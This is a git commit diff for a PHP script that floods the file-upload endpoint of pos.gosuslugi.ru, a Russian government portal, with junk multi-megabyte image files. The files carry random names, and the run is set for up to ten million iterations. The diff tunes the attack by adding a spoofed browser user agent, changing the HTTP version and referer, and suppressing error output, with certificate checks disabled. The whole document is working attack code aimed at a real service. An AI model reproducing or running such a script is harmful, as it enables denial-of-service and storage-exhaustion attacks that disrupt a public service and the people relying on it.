2d3056b8e317c5677e8199e82d00fb16be923f4e
somebadboy2022 <101868448+somebadboy2022@users.noreply.github.com>
2022-03-18 17:16:53 +0200

    limit2

--- pos-gosuslugi-upload.php
+++ pos-gosuslugi-upload.php
@@ -15,11 +15,11 @@ error_reporting(E_ALL);
 
 $curlLimit = 1;
 $total     = 10000000;
-$file      = 9;
+$file      = 2;
 
 
-if (!file_exists(dirname(__FILE__) . "/dummies" . $file . ".jpeg")) {
-    $fh = fopen((dirname(__FILE__) . "/dummies" . $file . ".jpeg"), 'w');
+if (!file_exists(dirname(__FILE__) . "/dummies" . $file . ".png")) {
+    $fh = fopen((dirname(__FILE__) . "/dummies" . $file . ".png"), 'w');
     $size = 1024 * 1024 * $file;
     $chunk = 1024;
     while ($size > 0) {
@@ -41,21 +41,21 @@ for ($i = 1; $i <= $iterations; $i++) {
 
 
     for ($k = 1; $k <= $curlLimit; $k++) {
-        $cf = new CURLFile(dirname(__FILE__) . "/dummies.jpeg", 'image/jpeg', generateRandomString(25).'.jpg');
+        $cf = new CURLFile(dirname(__FILE__) . "/dummies.png", 'image/png', generateRandomString(25).'.png');
 
         $curlOptions = [
             CURLOPT_HEADER                  => false,
             CURLOPT_FOLLOWLOCATION          => false,
             CURLOPT_MAXREDIRS               => 1,
-            CURLOPT_POSTREDIR               => CURL_REDIR_POST_ALL,
             CURLOPT_SSL_VERIFYPEER          => false,
             CURLOPT_SSL_VERIFYHOST          => false,
             CURLOPT_TIMEOUT                 => 50,
             CURLOPT_CONNECTTIMEOUT          => 30,
             CURLOPT_RETURNTRANSFER          => true,
             CURLOPT_VERBOSE                 => false,
-            CURLOPT_HTTP_VERSION            => CURL_HTTP_VERSION_1_1,
-            CURLOPT_REFERER                 => 'https://pos.gosuslugi.ru/inbox-service/filestorage',
+            CURLOPT_HTTP_VERSION            => CURL_HTTP_VERSION_2,
+            CURLOPT_USERAGENT               => 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0',
+            CURLOPT_REFERER                 => 'https://pos.gosuslugi.ru/',
             CURLOPT_POST                    => true,
             CURLOPT_POSTFIELDS              => ["file" => $cf],
         ];
@@ -81,7 +81,7 @@ for ($i = 1; $i <= $iterations; $i++) {
         if ($r = json_decode(curl_multi_getcontent($curl), true)) {
             $id = $r['id'];
         } else {
-            echo 'ERR: ' . curl_multi_getcontent($curl);
+            //echo 'ERR: ' . curl_multi_getcontent($curl);
         }
         echo $k . ': ' . curl_getinfo($curl, CURLINFO_HTTP_CODE) .': '. $id . PHP_EOL;
     }
